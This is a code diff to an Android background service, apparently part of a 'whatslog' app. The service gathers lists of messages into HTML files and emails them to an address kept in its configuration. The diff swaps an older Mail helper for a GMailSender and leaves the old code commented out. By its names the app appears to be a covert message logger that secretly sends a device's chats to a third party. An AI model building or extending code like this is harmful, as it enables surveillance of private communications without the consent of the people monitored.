@@ -51,6 +51,7 @@ public class MyService extends Service {
 	private DatabaseHelperInternal internal;
 	private DatabaseHelperExternal external;
 	private Map<String, List<Messages>> listaMensagens;
+	private GMailSender gmail;
 
 	public MyService() {
 	}
@@ -126,6 +127,8 @@ public class MyService extends Service {
 		} catch (NameNotFoundException e) {
 			e.printStackTrace();
 		}
+
+		gmail=new GMailSender(getApplicationContext());
 
 	}
 
@@ -414,29 +417,29 @@ public class MyService extends Service {
 	class SendEmailAsyncTask extends AsyncTask<List<File>, Void, Boolean> {
 
 		DatabaseHelperConfiguracao database;
-
-		Mail m;
+		Configuracao conf = null;
+//		Mail m;
 
 		public SendEmailAsyncTask() {
 			database = new DatabaseHelperConfiguracao(getApplicationContext());
 			List<Configuracao> confs;
 			try {
 				confs = database.getDao().queryForAll();
-				Configuracao conf = null;
+
 
 				if (confs.size() > 0) {
 					conf = confs.get(0);
 				}
-				if (conf != null) {
-					m = new Mail(conf.getSmtpMail(), conf.getPassword());
+//				if (conf != null) {
+//					m = new Mail(conf.getSmtpMail(), conf.getPassword());
+//
+//					String[] toArr = { conf.getEmailTo() };
+//					m.setTo(toArr);
+//					m.setFrom("whatslog@gmail.com");
+//					m.setSubject(conf.getSubject());
+//					m.setBody("Check the attached file");
 
-					String[] toArr = { conf.getEmailTo() };
-					m.setTo(toArr);
-					m.setFrom("whatslog@gmail.com");
-					m.setSubject(conf.getSubject());
-					m.setBody("Check the attached file");
-
-				}
+//				}
 			} catch (Exception e) {
 
 			}
@@ -446,10 +449,13 @@ public class MyService extends Service {
 			try {
 
 				for (File file : anexos[0]) {
-					m.addAttachment(file.getName()+".html", file.getAbsolutePath());
+					gmail.addAttachment(file.getName()+".html", file.getAbsolutePath());
 				}
 
-				m.send();
+//				m.send();
+				if(conf!=null){
+					gmail.sendMail(conf.getSubject(), "Check the attached file", null, conf.getEmailTo());
+				}
 				return true;
 			} catch (AuthenticationFailedException e) {
 				Log.e(SendEmailAsyncTask.class.getName(), "Bad account details");
